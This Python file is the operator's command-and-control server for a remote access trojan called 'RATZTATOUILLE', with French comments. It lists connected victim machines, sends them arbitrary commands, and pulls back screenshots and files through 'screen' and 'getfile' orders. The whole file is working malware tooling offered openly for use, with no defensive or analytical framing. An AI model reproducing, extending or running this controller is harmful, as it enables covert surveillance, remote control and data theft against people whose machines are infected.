from PIL import Image
import traceback
import time
import sys
import os

global sockslist
sockslist = []

logo = """\
            `-.
         -::/:
        //:+o++/-`
        ./shhs++yso.
        .syssyhshs/s::/`
        omdhyyyooo+so::`
        +mmdhdo+/:+o++/`
        .dmddhdhysy:`..``
         hmmdhhhyss
        `dmmdhysoos/
        ommhyyssosys-
        .mNmhysssssyyo:
        -mNNdhsosssydyo/      ``
        +dmdhyssosyhyss:     .
         ydyooyyysyyyyso.    `.
        .mmdyshs++sssyys+`    ..
        oNmmddho+ssyhyyys:     `-
        `dmdddddyyyhhhsssso     .-
        -mdhhhhhyyhhyssooso```.-.`
        `ddhhddhhhdhysooss+-..`
        .yhdddhddmmdhyo+-
         `..`  `////.`

         RATZTATOUILLE
    """


# Fonction d'affichage du menu
def menu():
    os.system('clear')
    print(logo)
    print("--------------Menu-----------------\n")
    print("[0] Quit")
    print("[1] Refresh connection")

    for pos, client in enumerate(sockslist):
        ip, port = client[0].getpeername()
        print(f"[{pos + 2}] {ip}:{port}")

    choice = int(input("\nAnswer : "))
    if choice == 0:
        os._exit(1)
    elif choice == 1:
        menu()
    else:
        choice -= 2
        SendClient(sockslist[choice][0])


# Ajout des nouvelles sockets
def handle_client(client): 
    if client not in sockslist:
        sockslist.append(client)


# Lancement du serveur
def start_server(sock): 
    while True:
        client = sock.accept()
        handle_client(client)


# Envoie des commandes au client
def SendClient(sock): 
    os.system('clear')
    while True:
        message = ""
        while not message:
            message = input(str(sock.getpeername()[0]) + ":" + str(sock.getpeername()[1]) + " : What's your order master ? ")
        sock.sendall(message.encode("cp850"))

        # Receive all packets
        fragments = []
        while True: 
            chunck = sock.recv(1024)
            if "end" in str(chunck): 
                break
            else:
                fragments.append(chunck)

        # Screenshot
        if message == "screen":
            screenshot(fragments, sock)

        elif "getfile" in message:
            getfile(fragments, sock,message)

        elif message in ["exit", "shutdown"]:
            menu()

        # Other RAT functions
        else:
            response = "".join([x.decode("cp850") for x in fragments])
            print(f"\n{response}")


# Fonction d'envoie des commandes par interface graphique
def SendClientGraph(sock, message): 
    sock.sendall(message.encode("cp850"))
    
    # Receive all packets
    fragments = []
    while True: 
        chunck = sock.recv(1024)
        if "end" in str(chunck): 
            break
        else:
            fragments.append(chunck)

    # Screenshot
    if message == "screen":
        screenshot(fragments, sock)

    elif "getfile" in message:
        getfile(fragments, sock,message)

    # Other RAT functions
    else:
        response = "".join([x.decode("cp850") for x in fragments])
        return response


# Take a screenshot
def screenshot(frags, s):
    # Name of the image, based on the date and time
    date = time.strftime("%Y%m%d-%H%M%S")
    strg = "".encode()

    # Create the image, write the data received
    with open(f"{date}.png", 'wb') as myfile:
        for x in frags:
            strg += x
        myfile.write(strg)

    # Open the image
    Image.open(f"./{date}.png").show()


# Download file
def getfile(frags, s, msg):
    # Name of the image, based on the date and time
    date = time.strftime("%Y%m%d-%H%M%S")
    strg = "".encode()

    # Create the image, write the data received
    with open(f"{date}", 'wb') as myfile:
        for x in frags:
            strg += x
        myfile.write(strg)
